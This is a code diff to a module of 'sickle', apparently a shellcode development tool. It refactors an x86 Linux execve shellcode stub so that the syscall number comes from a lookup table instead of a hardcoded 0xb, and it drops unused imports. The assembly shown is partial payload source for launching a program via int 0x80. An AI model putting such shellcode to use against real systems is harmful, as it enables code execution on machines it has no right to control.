@@ -7,11 +7,6 @@ from sickle.common.lib.reversing import mappings
 
 from sickle.common.lib.reversing.assembler import Assembler
 
-from sickle.common.headers.linux import (
-    net,
-    bits_socket,
-)
-
 class Shellcode():
 
     arch = "x86"
@@ -41,6 +36,8 @@ class Shellcode():
 
         self.arg_list = arg_object["positional arguments"]
 
+        self.syscalls = mappings.get_linux_syscalls(["execve"])
+
     def generate_source(self):
         """Returns assembly source code for the main functionality of the stub
         """
@@ -54,12 +51,11 @@ start:
     mov    ebx, esp
     mov    ecx, eax
     mov    edx, eax
-    mov    al, 0xb
+    mov    al, {self.syscalls['execve']}
     int    0x80
     xor    eax,eax
     inc    eax
     int    0x80
-
         """
 
         return source_code
